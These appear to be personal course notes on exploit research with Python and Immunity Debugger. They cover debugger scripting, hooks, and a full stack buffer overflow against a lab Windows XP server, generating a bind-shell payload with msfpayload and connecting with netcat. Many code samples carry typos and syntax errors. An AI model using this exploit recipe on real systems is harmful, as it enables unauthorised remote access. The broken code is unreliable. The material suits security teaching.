Part 1: Exploit Research Basics 

Art of Exploit Research 

	Platforms	Exploitation
	Windows XP - SP1, SP2 …	Simple Buffer Overflows
	Windows Vista - SP …	SEH, SafeSEH
	Windows 7 - SP …	NX, DEP
	Windows Server 2003, 2008 …	ASLR
	Linux 	Stack Cookies
	Mac OSX	…

Tools of the Trade

	• Immunity Debugger (free)
	• Metasploit Framework (free)
	• OllyDbg (free)
	• IDA Pro ($$, through older free version available)
	• WinDbg (free)
	• … other tools wherever necessary

Pre-Requisities 

	• Assembly Language Programming in Linux
	• Assembly Language Programming in Windows
	• Buffer Overflow Primer on Linux

http://www.securitytube.net/groups?operation=viewall&group…


Objective of this Module

	• NOT a comprehensive guide on Exploitation Techniques
		○ A course in itself (multiple OS, architecture …)
	• How to apply Python in conjunction with Immunity Debugger to analyze binaries for exploitation 
	• Apply Scripting and Automation to Exploitation 

Sampling a Buffer Overflow

	• Crashing the Program
	• Code in Python 
	• Analyze Crash 

	We will use Immunity Debugger 1.85 and crash analysis on Windows XP to keep the exploitation part simple 

	XP-machine:
	Server-Strcpy 
	192.168.56.101
	
	Run the Server-Strcpy
	hi 
	
	Attacking machine:
	# nc 192.168.56.101 10000
	hi
	
	# vi strcpy.py
	------------
	#!/usr/bin/env python 
	
	import socket
	import sys
	
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((sys.argv[1], 10000))
	buffer = "A"*500
	
	sock.send(buffer)
	print sock.recv(1024)
	sock.close()
	------------
	
	# chmod a+x strcpy.py
	# ./strcpy.py 192.168.56.101
	
	Application crashes and Offset shows the hex value of A (41414141) which means EIP is overridden with As. 

Part 2: Immunity Debugger Basics 

	Open the application in Immunity Debugger. 
	
	# ./strcpy.py 192.168.56.101
	
	Features: 
	Immunity Debugger Python Shell
	PyCommands List 
	
	Select API help file -> IMMLIB
	-> Immunity Debugger Python API 
	Immunity Debugger API Reference


Part 3: Immunity Debugger Scripting Basics 

Scripting Options with ID 

	• PyCommands 
	• PyHooks
	• PyPlugins

PyCommands

	• Simple scripts using the immlib APIs
	• Is not cached - can be changed at runtime
	• Quick prototyping
		○ Python Command Shell
	• Needs to define a main() and return a string (shown in status box)
	• May have arguments

Communcating Results 

	• Print to Status box via Return value
	• Print to Log Windows
	• Print to a Table
	• Write to File 

	Create a file 
	C:\Program Files\Immunity Debugger\PyCommands\spse-demo.py 
	
	--------
	#!/usr/bin/env python 
	
	import immlib
	
	def main(args):
		imm = immlib.Debugger()
		return "[+] Hello to the World of ID Scripting!" 
	--------
	On the Immunity Debugger, at to bottom line:
	!spse-demo 
	
	View > Log 
	
	--------
	#!/usr/bin/env python 
	
	import immlib
	
	def main(args):
		imm = immlib.Debugger()
		imm.log("Writing to my Log Window")
		return "[+] Hello to the World of ID Scripting!" 
	--------
	On the Immunity Debugger, at to bottom line:
	!spse-demo 
	
	
	--------
	#!/usr/bin/env python 
	
	import immlib
	
	def main(args):
		imm = immlib.Debugger()
		imm.log("Writing to my Log Window")
		imm.updateLog()
		return "[+] Hello to the World of ID Scripting!" 
	--------
	On the Immunity Debugger, at to bottom line:
	!spse-demo 
	
	
	--------
	#!/usr/bin/env python 
	
	import immlib
	
DESC = "A Simple Hello World Script" 
	
	def main(args):
		imm = immlib.Debugger()
		imm.log("Writing to my Log Window")
		imm.updateLog()
		return "[+] Hello to the World of ID Scripting!" 
	--------
	On the Immunity Debugger, at to bottom line:
	!spse-demo 
	
	Open Immunity Debugger Python Shell
	
	>>> imm.log("Write to Log")
	>>> imm.ps() 
	>>> td = imm.createTable("SPSE Course", ['PID', 'Name'])
	>>> td.add(0, ['26', 'Melih']
	------------------------
		# create a table and print the results 
		td = imm.createTable("SPSE Course", ['PID', 'Name', 'Path', 'Service'])
		
		# get list of processes
		psList = imm.ps()
		for process in psList:
			td.add(0, [ str(process[0], process[1], process[2], str(process[3])])
		return "[+] Success!" 
	------------------------
	
	--------
	#!/usr/bin/env python 
	
	import immlib
	
	def main(args):
		imm = immlib.Debugger()
		imm.log("Writing to my Log Window")
		imm.updateLog()
		
		td = imm.createTable("SPSE Course", ['PID', 'Name', 'Path', 'Service'])
		psList = imm.ps()
		for process in psList:
			td.add(0, [ str(process[0], process[1], process[2], str(process[3])])
		
		return "[+] Hello to the World of ID Scripting!" 
	--------
	On the Immunity Debugger, at to bottom line:
	!spse-demo 

Exercise 

	• Write the list of processes in a CSV file
		○ The first row should be the table column names 


Part 4: Process in Depth 

Emulate the same in Code 

	• Open / Attach to a process
	• Find list of all modules in the process
		○ Name
		○ Base address
		○ Size
		○ Entry point
		○ Version 

	spse-pro.py 
	-------------
	#!/usr/bin/env python 
	
	import immlib 
	
	DESC="Play with processes!"
	
	def main(args) :
		imm = immlib.Debugger()
		imm.openProcess("c:\\Documents and Settings\\securitytube\\Desktop\\Metasploit Exploit Research\\Server-Strcpy.exe")
		return "Success"
	-------------
	On the Immunity Debugger, at to bottom line:
	!spse-demo 
	
	-------------
	#!/usr/bin/env python 
	
	import immlib 
	
	DESC="Play with processes!"
	
	def main(args) :
		imm = immlib.Debugger()
		# imm.openProcess("c:\\Documents and Settings\\securitytube\\Desktop\\Metasploit Exploit Research\\Server-Strcpy.exe")
		imm.Attach(int(args[0]))
		return "Success"
	-------------
	On the Immunity Debugger, at to bottom line:
	!spse-demo 
	
	Open Immunity Debugger Python Shell
	
	>>> imm.getAllModules()
	
	-------------
	#!/usr/bin/env python 
	
	import immlib 
	
	DESC="Play with processes!"
	
	def main(args) :
		imm = immlib.Debugger()
		# imm.openProcess("c:\\Documents and Settings\\securitytube\\Desktop\\Metasploit Exploit Research\\Server-Strcpy.exe")
		# imm.Attach(int(args[0]))
		
		td = imm.createTable("SPSE Course", ['PID', 'Name', 'Path', 'Service'])
		moduleList = imm.getAllModules()
		for entity in moduleList.values() :
			td.add(0, [ entity.getName(),
				'%08X'%entity.getBaseAddress(),
				'%08X'%entity.getEntry(),
				'%08X'%entity.getSize(),
				Entity.getVersion()
				])
				
		imm.log(str(imm.getRegs()
		
		return "Success"
	-------------
	On the Immunity Debugger, at to bottom line:
	!spse-demo 


Part 5: Assemble, Disassemble, Search and Locate Instructions 

Assemble / Disassemble Instructions 

	• Assemble Instructions
		○ imm.assemble(…)
		○ Multiple instructions seperated by "\n"
	• Disassemble instructions
		○ imm.diasm(address).getdisasm()
		
	Open Immunity Debugger Python Shell
	
	>>> imm.assemble('JMP ESP')
	>>> imm.assemble('JMP ESP\nRET')
	
	>>> imm.disasm(0x00401267]
	>>> imm.disasm(0x00401267].getDisasm()

Search / Locate for Instructions

	• imm.search(assembled_instruction)
	• Find the corresponding module
		○ imm.findModule(address)
		○ Returns tuple(module_name, base_address) 

	>>> imm.search('\xff\xe4')
	>>> imm.findModule(2011414945)
	
	spse-find.py 
	-------------
	#!/usr/bin/env python 
	
	import immlib
	
	DESC="Find Instructions"
	
	def main(args)
		imm = immlib.Debugger()
		assembledInstruction = imm.assemble(' '.join(args))
		
		if not assembledInstruction :
			return "[-] No Instruction Given!"
		
		addressList = imm.search(assembledInstruction)
		td = imm.createTable("Instruction Locations", ['Module', 'Base Address', 'Instructions Address',  'Instruction']
		
		for address in addressList :
			# Get module for this address
			module = imm.findModule(address)
			if no module:
				imm.log("Address: 0x%08X not in any module" %address)
				continue 
			
			# Get module object by time. Please note we are not checking for page properties
			# exercise? :)
			
			instruction = ''
			numArgs = len(' '.join(args).split('\n')) 
			
			for count in range(0, numArgs) :
				instruction += imm.disasmForwards(address, nlines=count).getDisasm() + ' '
			
			td.add(0, [ module[0], 
				str('0x%08X'%module[1]),
				str('0x%08X'%address),
				instruction
				])
		return "Success" 
	-------------
	On the Immunity Debugger, at to bottom line:
	!spse-find  jmp esp
	
	PyCommand Arguments 
		Pop eax
		Ret 


Part 6: PyHooks 

Why Hooks?

	• Event Driven - exceptions, function calls, process and thread creations etc. 
	• Allow for "reactive" approach when events are hit.
	• Can be part of PyCommand scripts or can be stand alone.

PyHooks - Which Events? 

	• FastLogHook
	• STDCALLFastLogHook
	• Hook
	• BpHook
	• LogBpHool
	• PreBpHook
	• AllExceptHook
	• PostAnalysisHook
	• AccessViolationHook
	• RunUnrilAV
	• LoadDLLHook
	• UnloadDLLHook
	• CreadThreadHook
	• ExitThreadHook
	• CreateProcessHook
	• ExitProcessHook

	Immunity Debugger Documentation 

AllExceptHook

	• Triggers when program exceptions happen
	• All exceptions included
	• Lets write some code! :)

	spse-hook.py
	---------------
	#!/usr/bin/env python 
	
	import immlib
	from immlib import AllExceptHook
	
	class DemoHook (AllExceptHook) :
	
		def __init__(self) :
			AllExceptHook.__init__(self)
			
		def run(self, regs) :
			imm = immlib.Debugger()
			eip = regs['EIP']
			esp = regs['ESP']
			
			imm.log("EIP: 0x%08X ESP: 0x%08X"%(eip, esp))
			
			# printing the string available in ESP
			# what if string does not exist? :) 
			
			buf = imm.readString(esp)
			
			if len(buf) :
				imm.log('String len at ESP: %d\n%s'%(len(buf), buf))
				
		def main(args) :
			imm = immLib.Debugger() 
			newHook = DemoHook()
			newHook.add("Demo Hook")
			
			return "SPSE Hooking PyCommand" 
	---------------
	On the Immunity Debugger, at to bottom line:
	!spse-hook-demo
	
	# ./strcpy.py 192.168.56.101
	
	Look at the Log window. 

BpHook / LogBpHook Exercise 

	• Our vulnerable program uses strcpy()
	• Can you create a hook for the strcpy() function which will print all the function arguments
	• How can we infer an overflow is about it happen? 

Injection Hooking

	• FastLogHook, STDCALLFastLogHook
	• Uses injection hooking and does not need debugger
	• Idea is to inject our code and redirect control
		○ Finish logging and return to normal flow 

Injection Hooking Exercise 

	• Convert the previous exercise to use injection hooking 


Part 7: Exploiting a Buffer Overflow 

Buffer Overflow Exploitation 

	• http://www.securtytube.net/groups?operation=view&groupId=7
		○ Buffer Overflow
		○ SEH etc. 
	• Lets analyze simple buffer overflow 

Remember the Stack Layout?



Overwrting the Stack with "A"



Successful Exploitation



How do we find the offset and memory addresses? 



	# vim attack.py 
	--------------------
	#!/usr/bin/env python 
	
	import socket, sys
	
	sock = socket.socket(scoket.AF_INET, socket.SOCK_STREAM)
	sock.connect((sys.argv[1], 10000))
	
	buffer = "A"*500
	
	sock.send(buffer)
	sock.close() 
	--------------------
	
	#./pattern_create.rb 500 
	
	"results of pattern_create"
	
	# vim attack.py 
	--------------------
	#!/usr/bin/env python 
	
	import socket, sys
	
	sock = socket.socket(scoket.AF_INET, socket.SOCK_STREAM)
	sock.connect((sys.argv[1], 10000))
	
	buffer = "results of pattern_create"
	
	sock.send(buffer)
	sock.close() 
	--------------------
	
	#./attack.py 192.168.56.101 
	
	
	Go to Immunity Debugger and open the application. 
	On the bottom line: 
	
	!spse-hook-demo 
	
	Go to Log window and check. 
	EIP: 0x9A413969
	ESP: 0x0022FB70
	String len at ESP: 228o0Aj1Aj2Aj3Aj4Aj5A…
	
	# ./pattern_offset.rb 0x9A413969
	268
	
	#./pattern_offset.rb 0Aj1A
	272
	
	
Vulnerable Code - using Strcpy()

	int VulnerableFunction(char *userInput)
	{
		char buffer[256];
		strcpy(buffer, input);
		return 1;
	} 

Bad Characters

	• Are used to delimit input from the user
	• E.g.
		○ End of string input is denoted by NULL byte which is 0x00
		○ End of HTTP header field is denoted by \r\n
	• Bad characters break the input which we can send to the vulnerable program 

Finding Bad Characters 

	1. Send program the full list of characters from 0x00 to 0xFF
	2. Check using debugger if input breaks
	3. If so, find the character which breaks it
	4. Remote that character from the list and go back to 1
	5. If input no longer breaks, the rest of the characters can be used 

Address Contains 0x00 in it 



Successful Exploitation 




	# msfpayload -l 
	# msfpayload windows/shell_bind_tcp R |msfencode -a x86 -b "\x00" -t c 
	"msfpayload_buffer"
	
	# vim attack.py 
	--------------------
	#!/usr/bin/env python 
	
	import socket, sys
	
	sock = socket.socket(scoket.AF_INET, socket.SOCK_STREAM)
	sock.connect((sys.argv[1], 10000))
	
	buffer = "A"*268
	Buffer += ""
	Buffer += "\x90"*20
	Buffer += ("msfpayload_buffer")
	
	sock.send(buffer)
	sock.close() 
	--------------------
	
	Go to Immunity Debugger and open the application. 
	On the bottom line: 
	
	!spse-find jmp esp 
	--> get one of the address "\xFB\x7B\xAB\x71"  - big endian olduğu için tersten yazılır. Ekranda 0x71AB7BFb diye görünür. 
	
	# vim attack.py 
	--------------------
	#!/usr/bin/env python 
	
	import socket, sys
	
	sock = socket.socket(scoket.AF_INET, socket.SOCK_STREAM)
	sock.connect((sys.argv[1], 10000))
	
	buffer = "A"*268
	Buffer += "\xFB\x7B\xAB\x71"
	Buffer += "\x90"*20
	Buffer += ("msfpayload_buffer")
	
	sock.send(buffer)
	sock.close() 
	--------------------
	
	# ./attack.py 192.168.56.101 
	
	# nc 192.168.56.101 4444 
	-> got shell 
	>dir 
	
Exercise #1 

	• Write a script to find bad characters in this example 
	• More examples:
		○ http://www.securitytube.net/groups?operation=view&groupId=7
			§ Buffer Overflow
			§ SEH
			§ … 

Exercise #2 

	• What is DEP, ASLR and SafeSEH? 
	• Please write PyCommand scripts to find if modules have the above enabled 
